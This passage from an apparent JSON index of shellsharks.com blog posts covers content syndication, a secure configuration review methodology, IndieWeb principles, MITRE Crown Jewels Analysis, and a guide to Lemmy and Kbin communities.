poster‚Äôs guide to the new internet‚Äù which gives some historical context as well as what the challenges are facing modern syndication strategies as it applies to the ‚ÄúIndieWeb‚Äù. I recommend listening as it is very interesting and educational! So what is the Shellsharks syndication strategy, and why have I decided to approach syndication in the way that I have? Let‚Äôs get into it. To start, let me list where I typically share out content. * There are more experimental aspects of ‚ÄúIndieWeb‚Äù that I don‚Äôt quite ascribe to. But fundamentally, content ownership, identity and control are all core to my approach to existing on the web. Syndication Destinations: shellsharks. com (This is the origin for a lot of my content but also where I reverse-syndicate some posts that originate from social media. ) Mastodon / GoToSocial / the Fediverse Threads Lemmy / Kbin Discord Bluesky (rarely) Reddit (I‚Äôve mostly given up here for now) Other (e. g. LinkedIn, Matrix, iMessage, Nostr, Squabblr, Slack, etc‚Ä¶)Syndication Philosophy: How do I cross-post content and why do I feel the need to ‚Äúsyndicate‚Äù content in this way? Here‚Äôs a ramble-tastic look into my mind‚Ä¶ I imagine in today‚Äôs world, less people than ever use straight bookmarks to save and revisit websites they enjoy. Bummer. Instead, they rely on social media platforms to bring them new and interesting content. It would be great if everyone used an RSS aggregator and subscribed to my blog but the reality is that the majority of people don‚Äôt know what RSS is. So, I need to be where people are, and even in the context of big social, not everyone is in the same place. Unless I syndicate to multiple places, I won‚Äôt have near-comprehensive reach. Therefore, I need to publish my stuff to a number of places. What happens when a platform dies? Many people are finding out as X (formerly Twitter) burns. The communities you‚Äôve built, your social ‚Äúgraph‚Äù and your content all go up in flames as well. By adopting a strategy that continuously reminds people that I am ‚Äúshellsharks. com‚Äù and not ‚Äú@shellsharks@twitter. com‚Äù (for example), I can hopefully retain some followership even in the wake of network death. This reminder comes in the form of backlinks to my site on posts that are made on the social platforms themselves. What I am describing here is not just retaining your followers but also establishing a fixed, portable identity on the web. Platforms come and go, but in theory a domain you purchase and establish can be a way for people to find you indefinitely. This is the one thing about Bluesky that I really liked. They introduced a way to make a domain you own your handle on the site. So on Bluesky, I am shellsharks. com. Cool! The WebFinger protocol offers another interesting path to facilitating an online identity. I have for example, set up a WebFinger endpoint for my site where if you simply search for ‚Äúshellsharks. com‚Äù on Mastodon, my profile will return no matter what instance my account is on! It would be cool to see big sites support something like IndieAuth for authentication/identity. You would be using your site as a source of identity which could allow people to effectively follow your site across social media platforms rather than being locked in to following only your local account on each. This would also help with handle-squatting issues that pop up with new platforms. Speaking of the disaster that is X, especially for content creators, consider now that X has taken a hostile position against external links, preventing discovery or even existence of links that would send you away from the site. This is among many other things that make X utterly uninhabitable. This represents the extreme end of platform lock-in but make no mistake, big tech wants you on THEIR site, not out exploring the open web. Content ownership is probably the main tenant of IndieWeb, and for good reason! When all your content exists within someone elses platform you lose a lot of control. Platform death could mean the loss of all your content. You are subject to questionable content moderation policies that could result in your content being removed or suppressed and of course you allow these companies to profit off of and get credit for your work rather than yourself. Don‚Äôt give away this value! So what‚Äôs my strategy? Do I simply write / publish something on my blog and then link to it on every destinaton platform the exact same way? Nope, it‚Äôs actually far more nuanced than that and as a result, does not have a lot of automation tied to it at this time. There is a lot that I consider when determining if and how I will syndicate content to a particular destination. Who is my audience? For example, if I‚Äôm posting a note about my favorite accounts to follow on Mastodon, I probably wouldn‚Äôt post it on Threads. Each platform has their own culture / norms, for example on Mastodon, I may use hashtags to help with discoverability, but with Threads I would not. Mastodon is a more technical crowd so I may reserve more technical content for that site. A lot of micro-blog-esque social media (e. g. X, Threads, even vanilla Mastodon) allow for only a couple hundered characters in a post. This means any syndicated content is typically just a summary and a link to the full post rather than dropping in the full content in the post itself. When I have something to say, it typically comes in very long form, so sharing larger posts via a link to my site is really the only way to go. To capture association between a post on my site and where I have syndicated it to, I have a mechanism on the site to drop the direct-links to social media posts on the blog post source so that the syndication links show up at the bottom of each post. So does everything I post get syndicated out? Does everything I post first on social media get reverse-syndicated back to the site? No and no. There are some things on the site that are experimental, more personal or just don‚Äôt easily fit into other spaces. For those posts, I leave them on the site for my own reference and for those who like my content enough to have either subscribed to the RSS feeds or peruse my site intermittently. As for my social media reverse syndication, I have no formal rule for this, but I tend to only publish things on my site that originated from social media if A. it‚Äôs decent reference material, i. e. I would want to go back to it or update it at some point, B. It get‚Äôs a lot of attention and becomes worthy of archival or C. it‚Äôs a longer or more thoughtful post. 99% of the time, these posts become notes on my site. This applies to replies as well, not just original posts by me. For a lot of replies on Mastodon, I typically will make them ‚Äúunlisted‚Äù which is meant to keep them off of timelines, still public but only accessible via the thread itself. I mentioned that I don‚Äôt use a lot of automation in my syndication methodology. This is in part because I haven‚Äôt spent the time to automate any part of the workflow, but equally it is because of this nuance in how I want to share my content. I rarely, if ever post the same content in the same way across multiple platforms. Therefore, I can‚Äôt really rely on an automation that would take a newly published blog post or note and simply repost it everywhere else. Another important aspect of not automating this sort of thing is that for anywhere I want my content to go, I really want to be a citizen of that platform. Rather than blasting a link to my site everywhere I‚Äôd rather hand-post it and then interact with replies. Further, by being someone who actively scrolls these feeds, I get a better feel for how I should post things, what would be interesting to those on the network and how I can more contextually post my content as replies to other peoples posts. For example, my original post was on how to get into infosec. My social networks happen to be filled with infosec professionals and aspiring pros who ask about how to get into the field. There‚Äôs my opportunity to reply with a link to that post! I‚Äôve said this before, engagement on social media is more about how you engage with others rather than expecting mass engagement on your own posts. The IndieWeb actually has its own social networking capability, coming in the form of Webmentions. Shellsharks. com hasn‚Äôt implemented Webmentions for technical and non-technical reasons. Getting it to work via Github Pages/statically generated Jekyll is not for the faint of heart. More than that though, I don‚Äôt see Webmentions being particuarly viable in its current form, moreso a check mark for IndieWeb superfans or those that really despise the idea of using any traditional social media platform. One thing Webmentions and the technology that facilitates it supports is the concept of bridging post replies back to your site in the form of a comments feed. For me, this is bad. I don‚Äôt want a bunch of comments junking up on my post, nor do I really want to be made painfully aware of posts that never received any engagement (haha). Further, having comments on my site means having to moderate these comments, no thanks. IndieWeb zealots also believe in having other post metadata available directly on the site of origin, things like likes and reposts. Again, more unncessary cruft. I think having links to where you‚Äôve syndicated content is sufficient. By going out to the platform a syndicated post lives on you can easily see the likes and resposts. There ya go! This is how and why I syndicate shellsharks content across the web. Have a site? Let me know what your approach is! Syndication WorkflowHere I‚Äôll more simply walkthrough what my syndication approach is. I write the blog post / note (duh). Since I use GitHub Pages, the content is published by committing it to the repo on GitHub. I have frontmatter on my post for where the content is syndicated to. At first, this is left blank. Once the post is published, I will write the various posts on respective social networks that I would like to syndicate out to. Most of the time, the syndicated posts will include a link to the source post on my site. Once the syndicated posts are published, I capture the direct links to each and include them in the frontmatter for the original post. I then have to recommit the post with the syndication links. The syndication links then appear at the bottom of individual posts. Ta da!" }, { "id": 59, "url": "https://shellsharks.com/secure-config-review", "title": "Secure Configuration Review", "body": "2023/10/27 - A secure configuration review is an evaluation and verification of configurable settings within a composite system. In scope for this type of assessment are system settings that are modifiable by a user, an admin user or the system vendor. Specifically, system settings that have an impact on the overall security posture of the system are assessed to determine what the most ‚Äúsecure‚Äù state is and whether it is secure-by-default (or similarly secured-by-design). This is in contrast to other types of security assessments that seek to identify design flaws or traditional vulnerabilities which are fixed by code changes or architectural adjustments, rather than simple application-level toggles/tweaks. Secure configuration reviews are typically conducted as part of a wider portfolio of security assessment activities (e. g. threat model, penetration test, design review, etc‚Ä¶) prior to system ‚Äúgo-live‚Äù. This review is ideally revisited directly before the system is promoted to production to ensure configurations are in fact in the previously determined/attested secure state. (* Note: I refer to this as a ‚ÄúPre-Launch Security Review‚Äù, the effect of which is commonly found in heavily change-managed environments, albeit under a different name. ) Security misconfigurations are prime targets for threat actors due to their commonality and ease of discovery. To explain - If a threat actor has access to an instance of the system, they can easily enumerate all possible attack vectors and vulnerabilities that manifest due to misconfiguration. As for their commonality, misconfigurations are frequent due to human error, usability-over-security demands, and insecure defaults, among other things. With that primer out of the way, let‚Äôs walk through a methodology for conducting secure configuration reviews. Conducting a Secure Configuration ReviewThe steps for conducting a secure configuration review are documented below. Consider the mnemonic ‚ÄúICECAP‚Äù to remember the sequence! Identify and profile the system to be reviewed. The profile should include basic pre-assessment information like technical PoC, data classification in-scope, externality, business purpose, etc‚Ä¶ Collect artifacts and access needed to perform the assessment. This would ideally include a plan from the implementor where they have documented how they intend to configure/secure the system. Enumerate security-related configurable settings within the system by leveraging access to the system and (hopefully) full documentation. For each identified config, document the default/by-design state and what the most secure state would be, paying special attention to settings that are insecure-by-default. Remember that different settings will be exposed depending on your privilege/user-context. This will ultimately yield a secure configuration baseline. For security-related settings you don‚Äôt find configurable within the system interface, and that you are particularly concerned with, consider asking the vendor whether it is configurable in the back-end by the vendor themselves. If not, you can atleast ask (or test), and document what the hardcoded setting is. In some cases, it may be easier to ask a blanket statement around what settings may only be toggleable by the vendor. They may also be willing to provide a vendor-written hardening guide for their platform or share what insecure-by-default settings they are aware of. Compare the implementors planned configuration/design with the secure configuration baseline developed in the previous step. For any deltas, work with the implementor on either mitigating misconfigurations or documenting the risk of a less-secure configuration. Attestation should be obtained from the implementor stating the intended configurations are in adherence with organizational policies (logical/non-technical controls) and any applicable, approved risk exceptions. This can be attached to the assessment case. Optional: Pre-Launch Security Review (PLSR) is conducted directly before the system is promoted to production as one last assurance step, confirming agreed upon configurations are in place. * Consider that secure configuration reviews typically identify settings within a system that are configurable to either a more secure or less secure state. Assurance around whether these states do in-fact provide heightened security is typically left to security reviews that dig deeper into the functionality of the system (i. e. penetration test). Requisite Assessment Inventory: The list below contains the artifacts, documents and access(es) typically required to conduct a proper secure configuration review. System architecture diagrams System security/hardening/implementation plan from the implementor(s) User/Admin guides/documentation Technical PoC from the vendor/developer/implementor to ask questions Access to the platform (user and admin privileges)Configuration Contexts: Configurable settings within a system/platform are exposed in a variety of contexts, each with differences in terms of what is exposed and who has access to modify them. These contexts are described in the list below. User - Settings configurable by a normal, non-privileged user. User-Admin - Settings configurable only by privilieged/administrative users of the system. Vendor - Settings configurable only by the vendor, typically in a back-end console via flags, etc‚Ä¶* Consideration: There may be configurable settings unique to each node/sub-system of a composite multi-tier system/platform (i. e. settings in the front-end web/app server as well as on back-end databases, etc‚Ä¶), so remember to walk through each distinct sub-system in-scope. Security-Related Configuration Settings: The list below includes common security-related configuration settings to evaluate when conducting a secure configuration review coupled with a description of an expected ‚Äúsecure config state‚Äù. This list is non-exhaustive, as other security settings may be exposed and configurable within the respective system under review.

" }, { "id": 60, "url": "https://shellsharks.com/indieweb", "title": "IndieWeb Assimilation", "body": "2023/07/16 - I‚Äôve been a huge advocate for independent blogging for a while now, both for personal and professional reasons. In fact, I‚Äôve written countless replies to early-career folks about documenting their learning journey via a blog. Since I first founded shellsharks (circa 2019), I‚Äôve devoted a fair bit of time not only to writing ‚Äúcontent‚Äù but also into a lot of little features that, to me, collectively gave the site depth as well as that sense of ‚Äúhaving everything a site should have‚Äù. Some of these features include, an RSS feed, robots. txt, humans. txt, security. txt, about page, tags, search, change log, license &amp; disclaimer and more. I‚Äôve poured my creativity, whimsy and mind into the aesthetic, writing and functionality of the site and as a result it has served as an ever-present source of identity and pride for me on the web. Recently, I was introduced to the concept of the ‚ÄúIndieWeb‚Äù (or small web), a ‚Äúpeople-focused alternative to the corporate web‚Äù. Intriguing right? My curiosity piqued, I soon discovered IndieWeb. org, an organization dedicated to the proliferation of IndieWeb resources, guides, community and more. They describe the IndieWeb as‚Ä¶ ‚Ä¶a community of independent &amp; personal websites connected by simple standards, based on the principles of: owning your domain &amp; using it as your primary identity, publishing on your own site (optionally syndicating elsewhere), and owning your data. 1 Sound familiar? Sounds kinda like what I‚Äôve been doing with my site for a while now! But what makes the IndieWeb special? Why should you or I care? Is there anything else to it? Read on to learn more! IndieWebThe IndieWeb (or ‚Äúsmall web‚Äù) is a collection of people-focused websites which share a core set of principles. The IndieWeb is not simply a missionless multitude however, the IndieWeb movement is all about reclaiming the web by de-centralizing what has become all too centralized, encouraging ownership (of your site and your content), and bringing a truer sense of fun and individuality back to the Internet. So why is the IndieWeb important? I‚Äôd suggest reading the following pieces by Dan Gillmor, Jamie Tanna &amp; Ariadne Conill, as they do a far more eloquent job than I probably would in explaining this. 1, 2 I‚Äôve previously made known my reasons for blogging, but now with a better understanding of the IndieWeb, and what‚Äôs at stake if we don‚Äôt embrace it, I now recognize that my infinitesimally small slice of the Internet guarantees me an incorruptible continuum for my content and my identity on the web. (Check out my IndieWeb. txt file!) Awesome! Now that we have a rough understanding of the IndieWeb ethos, let‚Äôs cover what is in my mind the principle mechanics of the IndieWeb. Principle Mechanics: This section does not provide exhaustive coverage of how to implement IndieWeb functionality. Instead, I simply summarize five core primitives which I feel comprise an IndieWeb site. For a more official gauge on where a site scores within the IndieWeb spectrum, consider leveraging IndieMark! Hosting: You need a place to host your site and store your content. There are a lot of great options out there. Ideally, choose one that allows you the ability to make some under-the-hood changes and does not limit your content portability. Syndication: Share your content with the world! There are two preferred methods for syndication, PESOS and POSSE. This resource does a great job explaining both! For more examples of how this is done, check this and this out. RSS is a great starting point for helping others subscribe to new content on your site. Writing: Though your site could simply serve as a more static point/identity on the web, with little to no ‚Äúcontent‚Äù being regularly added, I recommend writing! Interactivity: One of the more advanced concepts within the IndieWeb world, the ability to bake in native comments, replies, likes, etc is a greay way to build community. This interactivity helps mitigate reliance on centralized social networks for communication within Indie communities. One example of IndieWeb interactivity is Webmentions. Identity: Make it unique, make it fun, make it yours. The corporate web is sterile and suffocating. Let‚Äôs bring back the whimsy of the old web. IndieMarkIndieMark is a progressive set of requirements (from IndieWeb. org) which provide quantitative and level-based measurement of the indieweb-ness of a site. As discussed here, I‚Äôve decided to not benchmark my site with IndieMark. The Delightful Small Web: The Internet is vast, yet collectively we spend most of our time these days (sadly) within boring, behemoth, centralized corporate-web watering holes. Beyond the corporate web lies countless relics of the old web, unique destinations of the IndieWeb and delights of the small web. Webrings: A webring is a collection of websites that are linked together, each pointing to and from another site in the ring. They serve as a fun way to build community and facilitate discovery of new sites! Some Webrings and -related resources are provided below.

In the (my) beginning, it was very asset/defense-centric - What do we have? Patch all the things! Turn on all the blinky security appliances. Next, we added a new layer that was more attacker/threat-driven - red teaming, threat modeling, threat intelligence, etc‚Ä¶ So what‚Äôs the next advancement? How can we build upon these disciplines in a way that helps us further prioritize and ultimately mitigate risk? Consider now a business-focused, or better yet, mission-oriented approach to security. Rather than focus on potential operational impacts from the perspective of known threat actors or working on a bottomless approach to defense-in-depth, let‚Äôs instead orient ourselves around what is important to us (in the context of the respective organization) and define key mission objectives in which to center our security strategy. This is in fact step one of MITRE‚Äôs Crown Jewels Analysis (CJA), a process designed to identify cyber assets most critical to the accomplishment of an organization‚Äôs mission. As the name implies, one product of a completed CJA is a list of key assets (the ‚Äúcrown jewels‚Äù) which represent the most important atomic constructs your organization relies upon. In the absence of any other output, you could take these identified systems/assets as a prioritized queue and feed them into traditional security models such as defense-in-depth (defensive model) or threat modeling (offensive model) and quickly see the value. But the CJA also yields a dependency map, which illustrates a hierarchy of nodes and relationships that explains not only the technological/process dependencies your mission objectives rely on but can be leveraged to build far more insightful views including (but not limited to) where to apply security controls or where attackers may find weak spots to disrupt operations through nth order effects. 1, 2 Before diving into the more fine-grained mechanics of the CJA, here is a summarization of the assorted benefits you could expect as a result of performing one‚Ä¶ Facilitates joint conversation among key stakeholders. Breaks down assumptions and supports greater understanding of the mission Promotes balanced resource allocation between business innovation and security safeguards Prioritizes security investments Identifies true risk and business impact posed by potential compromise/degradation Determines acceptable levels of residual risk associated with each critical asset Establishes security countermeasures to effectively manage business risk profile 5, 7MITRE Crown Jewels Analysis (CJA) ProcessCrown Jewels Analysis (CJA) [SEG, pg. 167] is a methodology designed by MITRE to identify the cyber assets (‚Äúcrown jewels‚Äù) most critical to mission accomplishment. It consists of three distinct steps. 2 Establish Mission Priorities Identify Mission Dependencies Mission Impact Analysis * MITRE‚Äôs CJA is often used as an input into MITRE‚Äôs threat modeling and risk analysis model, TARA. Together, the CJA and TARA compose MITRE‚Äôs Mission Assurance Engineering (MAE) process. (I will not cover TARA/MAE much in this post. ) Ultimately, by increasing the work factor for an adversary and coupling security decisions with a more intimate understanding of mission priorities, an organization can better endure the constant barrage of attacks present within the modern threat landscape and build more robust operational resiliency. 2 Establish Mission Priorities: Step one of conducting a Crown Jewels Analysis is to identify and establish mission priorities. This is an area of MITRE‚Äôs CJA documentation that is curiously light. The question is simple though, ‚Äúwhat is important to your organization?‚Äù My recommendation? Start locally, within the security team, and brainstorm a list of probable objectives. If this is a challenging exercise for the team, it is an opportunity to reach outside the security silo, learn more about the business and become far more effective at practicing business-aware security moving forward. For a more authoritative perspective on key mission priorities, consider approaching security leadership, broader IT leadership or go directly to the source and invoke business leaders themselves. 2 Once we have established what the priorities of the business/organization are, we can begin constructing the map of interconnected tasks, functions and assets which comprise the dependency tree. Identify Mission Dependencies: Step two of the CJA is to identify mission dependencies. For this, MITRE prescribes a technique for dependency mapping, a (moderately rigorous) adaptation of the Risk-to-Mission Assessment Process (RiskMAP). The Dependency Map is a graph/tree built using mission priorities/objectives as the root/top-level parent nodes, then child nodes are linked using the following mapping ‚ÄúIf &lt;child&gt; fails or is degraded (as defined by the SMEs), the impact on &lt;parent&gt; is &lt;failure, degrade, work-around, nominal&gt;. ‚Äù Once complete, it is possible to analyze the impact of an asset/process failure/degradation through cascading if/then statements. 2 * A more rigorous approach to dependency mapping can be adapted using the Cyber Mission Impact Assessment (CMIA) process. 4 Consider the following when identifying potential crown jewels/key processes. System design details influence ‚Äúcriticality‚Äù in ways that developers (not operators) will more readily understand, so identifying key system accounts, critical files, and other critical assets will require technical insights from the development team. Deciding which cyber assets are most important to ‚Äúprotect‚Äù is based on the insights provided by the dependency map ‚Äúlinkage‚Äù to the Tasks and Mission Objectives. CJA can provide insight into which nodes to protect, what security controls to apply and where and how to apply them. 2 CAIPOne tool which can be used to facilitate critical asset ideation is the Critical Asset Identification Process (CAIP), brought to us by DODIG-2013-119. The report provides the following guidance for identifying and prioritizing critical assets. 3 Break down missions and functions into required tasks, standards, and capabilities Identify the task assets that support the missions to the required standards and capabilities Prioritize the assets identified based on the criticality of the mission and the availability of other assets that could satisfy required standards and capabilitiesMission Impact Analysis: Once mission dependencies have been identified, the third and final stage of the CJA can commence, the mission impact analysis. The dependency map depicted below demonstrates how failures/degradation of a (cyber) asset results in compromise of upstream information assets, tasks, functions and potentially entire missions. 2 Employing a graph-based mission dependency model can help show the transitive (nth order) mission impacts of cyberattacks. For example, a graph traversal query can begin at the victim host of an attack, and traverse the graph (vertically) to enumerate the mission components that depend on it, showing impact on all effected levels of the mission dependency hierarchy. After modeling a larger volume of potential attacks, common critical pathways will emerge which represent high probability vectors attackers tend to gravitate towards (‚Äúgravitational nodes‚Äù). A query could also traverse in the opposite direction, e. g. , to show the ‚Äúcyber key terrain‚Äù supported by a given mission component. Moreover, a mission dependency model could include important semantics such as relative criticality, ownership, geographic location, etc‚Ä¶ 6, 8 For describing criticality of an asset in the context of the mission, consider MITRE‚Äôs SCRAM Criticality Levels (listed below). 8 Level I: Total Mission Failure Level II: Significant Degradation Level III: Partial Capability Loss Level IV: Negligible or No LossThe mission impact analysis should yield insights into which nodes, specifically which cyber assets (leaf nodes) result in the most catastrophic mission failure upon compromise/degradation. These are your crown jewels. AppendicesCourses of ActionWhen performing mission impact analysis, consider resource allocation in the context of risk mitigation. The list below summarizes courses of action for mitigating potential weaknesses identified in the dependency map. 8 Technical ‚Äì redundant or spare cyber assets Replace: Can the cyber asset (e. g. , system, network) be replaced with redundant components (e. g. , spare servers, redundant network paths)? Reconstitute: Can the cyber asset be reconstituted? For example, can the system replicate a server instance from a gold master virtual machine image, or dynamically reconfigure the network. Service ‚Äì redirect from other area or fall back on alternative functionality Reposition: Are there identical services, potentially in neighbouring geographic regions, that can be repositioned to cover the mission area? Repurpose: Can the lost service functionality be (partially) replicated by repurposing other services? For example, email service may be used to provide some data transmission functionality similar to chat. Voice services (radio, VOIP) can be used as an alternative to digital communications (email, chat). Operational ‚Äì leverage concept of operations (CONOPS), call alternative commands for support Reuse: Can the missing functionality be fulfilled by reusing a similar service offered by another entity or organization? Retask: Can another entity or organization be retasked to complete or support the mission?

The Threadiverse, as it has been coined (and now tracked) specifically refers to the bloom of Lemmy and Kbin instances (more on these later) that have spawned and are now serving as places where former Reddit-dwellers are fleeing. I don‚Äôt intend on thoroughly covering what happened (and is continuing to happen - also this kinda thing now) with Reddit nor do I want to try to explain the Fediverse and its many virtues, but I do want to share my feelings (ramble a bit) on what the instability and uncertain future of Reddit (and other large platforms), paired with the promising future of the Threadiverse means for those of us looking to find and build meaningful and lasting communities elsewhere across the web. I think we as denizens of the Internet have become rather lazy, thanks in large part to the trend of content/activity centralization within the behemoth platforms like Facebook, Reddit, Twitter, etc‚Ä¶ We have become too comfortable relying solely on these companies to serve us news, articles of interest and updates from our connections, friends and family. As such, we have conceded control of these feeds (and thus our minds and perspectives) to aggressive ad-injection and the corporate algorithms designed to enrage us and maximize (toxic) engagement, all to boost profitability for these companies. For an age, we have settled for this breed of news and content because of the benefits big-social and big-tech bring, but a new age is upon us, one of accelerating enshittification. So what happens when these platforms finally sour to the enshittification point? What happens to the communities we‚Äôve built? The connections we‚Äôve made? The real, useful content stranded within? Where do we go? Enter the Fediverse and the IndieWeb at large. It is here that content can once again be ‚Äúours‚Äù, connectivity made more resilient and control recaptured. Here, we are far less vulnerable to the dangers and whims of the corporate weblords hellbent on extracting every last dollar from us at the expense of our privacy. Will it be easy to reclaim the web, our content and our connections? No, but thanks to a confluence of events, i. e. the growing set of (Fediversal) tools, a more motivated / awoken general populace, and an ever-incresasing portfolio of enshittified platforms, we may at last have the aggregate energy to overthrow then reclaim the web. 5 Enough of that, let‚Äôs get into what the options are beyond Reddit, how to use them and why it‚Äôs a good idea‚Ä¶ Threadiverse &amp; Beyond: So the Reddit exodus has begun, but where are people going? Similar communities and experiences have emerged within apps/instances of the ‚ÄúThreadiverse‚Äù as well as some other non-decentralized services. This guide focuses mostly on Fediverse-compatible, decentralized discussion platforms (i. e. the Threadiverse) but these other platforms are mentioned for the sake of moving away from Reddit. The list below summarizes where people are migrating‚Ä¶ Lemmy: Fediverse-compatible social link aggregation and discussion platform Kbin: Open source reddit-like content aggregator and microblogging platform for the Fediverse PieFed: A link aggregator, a forum, a hub of social interaction and information, built for the fediverse Mbin: Decentralized content aggregator, voting, discussion, and microblogging platform running on the fediverse NodeBB: Traditional forum platform that has recently added Fediverse support Discourse: Open source discussion platform (which has some Fediverse connectivity options) Tildes - non-profit community site driven by its users‚Äô interests Squabblr - ‚Äúcombines the best parts of Twitter, with the best parts of Reddit‚Äù Raddle - reddit alternative Lobsters - computing-focused community centered around link aggregation and discussion Hacker News Azorius - social link aggregator and comment forum which federates with other instances via ActivityPub FarkLemmy vs KbinSo, threadiversally speaking, what‚Äôs better, Lemmy or Kbin? Let‚Äôs start with how they are similar. Lemmy and Kbin are both link aggregators/discussion platforms centered around communities (in Kbin speak, they are called ‚Äúmagazines‚Äù). They both have upvotes/downvotes (e. g. mostly for post popularity rather than ‚Äúkarma‚Äù), sorting (e. g. ‚Äúhot‚Äù, ‚Äútop‚Äù, newest, ‚Äúactive‚Äù, etc‚Ä¶), thread-based posts where you can comment/reply, community subscribe, user following and are both compatible with ActivityPub and thus each other. So how do they differ? Not much really from what I can tell so far. The few notable differences are Kbin supports Mastodon/Twitter-esque microblogging as well as native ‚ÄúBoosting‚Äù, Kbin is a newer project (circa 2021) written in PHP versus rust-based Lemmy (circa 2019), and of course the projects are backed by different development teams *. Pick one and let‚Äôs go! 1 * NOTE: Some within the community have expressed concerns related to Lemmy dev‚Äôs political views. Operationalize Lemmy &amp; Kbin: Functionally speaking, there‚Äôs not much difference between Lemmy and Kbin, so once you‚Äôve decided which you want to start with, you can dive in and get sc-rollin‚Äô. Getting StartedGetting started with Lemmy/Kbin is pretty easy! Find an instance. Which instance you choose shouldn‚Äôt matter much in the end. You will be able to see, subscribe and interact with communities from other instances regardless of your home instance. One way to find an instance is to simply find a community you are interested in and join the instance that community is a part of. Some considerations for instance choosing include‚Ä¶ Is this instance stable? Does it have a good admin/moderation team? Is it well-funded? Is this instance at risk of defederation? This typically happens if it is hosting content that is bad. If so, it is at risk of being cut off from the wider network of Threadiverse instances. This should be the nuclear approach for instance admins, but there seems to be a fair bit of fedi-drama that could result in premature or poorly-reasoned defederation. It‚Äôs worth noting that, unlike w/ Mastodon and other services where building a following is important, it is less so with the Threadiverse. Here, communities rule and if your instance goes belly-up for some reason, it‚Äôs very easy to create an entirely new account on a new instance and then simply re-subscribe to all your old communities. Yes, you may lose some ‚Äúfollowers‚Äù and some post history but it shouldn‚Äôt matter as much in this context. * Bottom line, yes, these are things to be aware of, but you shouldn‚Äôt need to worry or care about this so don‚Äôt let it trip you up in terms of getting started. *OPTIONAL*: If you enjoy browsing on the go, consider downloading a mobile app. I‚Äôve enjoyed using Memmy so far. Find and subscribe to communities (and magazines) of interest! There are a few resources to aid in finding communities. The search functionality built directly within &lt;instance&gt;/communities (Lemmy) and &lt;instance&gt;/magazines (Kbin) can also be used to find communities, even across instances! Adding a specific community is as easy as typing !&lt;community name&gt;@&lt;instance name&gt; into the search bar. Start scrolling, reading, upvoting (or downvoting =/), replying, posting and enjoying! *OPTIONAL but Recommended*: Support your instance (financially - connect with your instance admin to learn how), volunteer (e. g. moderate), help grow the community!Some other guides that I‚Äôve seen pop up across the Threadiverse can be found in the References section. Finding CommunitiesFinding communities/magazines across the Fediverse of networked Lemmy/Kbin instances is easy! You can use native search functionality or you can use any of the following! With the reddit migration in full-effect, there are a few separate efforts which map sub-reddits to their new homes in the Threadiverse. sub. rehab - instances of Reddit communities on alternative platforms reddit migration directory Unofficial Subreddit Migration List | quippd - A comprehensive mapping of old subreddits to new communities Curated list of interesting instances/communitiesRemember, you can interact with remote communities (communities on other instances) directly from your own. You don‚Äôt need accounts on multiple instances. Also, try not to worry about community fracturing (i. e. /c/techonology on multiple instances), you can simply follow all of them and then view them all in the aggregate ‚Äúsubscribed‚Äù feed. In time, I suspect these communities will coalesce or simply operate in harmony (with minimal redundant noise). Interactivity w/ Mastodon: We refer to the network of Lemmy/Kbin instances as the ‚ÄúThreadiverse‚Äù because they are ActivityPub-compatible and thus part of the wider array of Fediverse applications. What does this mean beyond the Kbin &lt;‚Äì&gt; Lemmy interaction? Well it means there is some interactive capabilities w/ the most popular software of the Fediverse, Mastodon! I did some testing (thread 1, thread 2) not too long ago and made some observations‚Ä¶ NOTE: This testing was done at single point in time, using an isolated set of Lemmy/Kbin/Mastodon instances. Future updates or at-the-time configuration for any of these projects/instances could change observed behavior. You can post to a Lemmy/Kbin community by using @&lt;community&gt;@&lt;server&gt; where the first line is the title of the post, followed by two returns and then the rest of the post is the body. This will post TO a community from your Mastodon handle. NOTE: At least for the instance I tried this on, I had issues responding to that Mastodon-originated post from my Lemmy account, but others with Lemmy accounts on other instances were able to respond, so it could be an isolated issue with my instance. You can reply to Lemmy threads via Mastodon as well. This includes posts you originated from Mastodon, or by searching for a Lemmy post by URL within Mastodon and replying from there. You can find Lemmy communities via Mastodon search, peruse posts and reply to them, even for communities that are otherwise locked down to just members of that community. You can follow Lemmy/Kbin accounts from Mastodon. You can even follow communities from Mastodon! Kbin posts, as seen from Mastodon look like this. (Fedia source) Lemmy posts, as seen from Mastodon look like this. (infosec. pub source) Some other Kbin &lt;‚Äì&gt; Mastodon stuff talked about here. Instance Hosting &amp; Community Management: I‚Äôm not an instance admin, nor have I ever self-hosted an instance so I won‚Äôt attempt to explain any of that, but I want to list out a few pointers related to community creation/management‚Ä¶ Creating a community/magazine is dead simple (as long as your instance supports open creation). When creating a community, be mindful of the real possibility that the exact same community exists elsewhere. Not that you can‚Äôt create the same thing on a different instance, but it may make more sense for you to simply join/subscribe an existing community. You should provide some thoughtful rules for appropriate conduct within your community. They should abide by/inherit the rules of the parent instance and be used to enforce moderation decisions. Moderation is an extremely important property of a healthy online community. I‚Äôm no moderation expert, nor am I a particularly seasoned community manager, but I understand the importance of moderation and the difficulties that arise when attempting to perform it at scale. As the Threadiverse grows, its moderation capabilities must scale to meet demand. Rather than attempt to provide any meaningful analysis on the state of moderation capabilities within the Threadiverse, I‚Äôll instead link to a few interesting resources/discussions I‚Äôve come across‚Ä¶ This thread from @Nadya@kbin. social on moderation Beehaw‚Äôs mod tools needs IFTAS - Non-profit team organizing to help foster and preserve inclusive, civil discourse for the common good Fediseer - FOSS service to help Fediverse instances detect and avoid suspicious instances. (Instructions for verification) Set out to build and grow communities that are human-centric. Cast aside traditional desires of clout-chasing, aggressive growth and monetization. Be civil, be kind and have fun! Infosec. Pub &amp; Fedia Cybersecurity Community: This piece should be considered software/instance/community-agnostic, it is a guide for the larger Threadiverse. That said, there are two instances, and a community within both respective instances that I have created and am actively investing time into, specifically /c/cybersecurity on infosec. pub and /m/cybersecurity on Fedia. It is no secret that I am a cybersecurity professional and avid community-engager. Between this blog, my Discord, and overall Reddit history (purposefully not linking to my handle) in various infosec-related subs, I like to think of myself as a mentor and one who is very community-forward. To add to that collection (if you will), I have stood up these two communities as (unofficial) landing spots for infosec folks fleeing big-tech-run communities like those of Reddit (namely r/cybersecurity of which I was very active). The future of the Threadiverse is somewhat uncertain, and by somewhat I am referring to its ability to capture meaningful mindshare and daily active users, not so much its general staying power (i. e. people have proclaimed Mastodon to be dead for years and yet it is still going, and by all counts, stronger than ever these days. ) But Reddit doesn‚Äôt need to die for the Threadiverse to survive, an active community just needs to exist and I plan to help foster the cybersecurity/infosec community on these platforms as best I can. The instance admin for both infosec. pub and Fedia, the venerable Jerry has done an amazing job with the various Fediverse projects/instances he nearly single-handedly deploys, maintains and administers and in him I have faith for the continued function of the instance(s). (In fact, I highly recommend you support his work if you are able to!) So how can you get involved, participate and grow the community? It‚Äôs easy! Follow the Getting Started 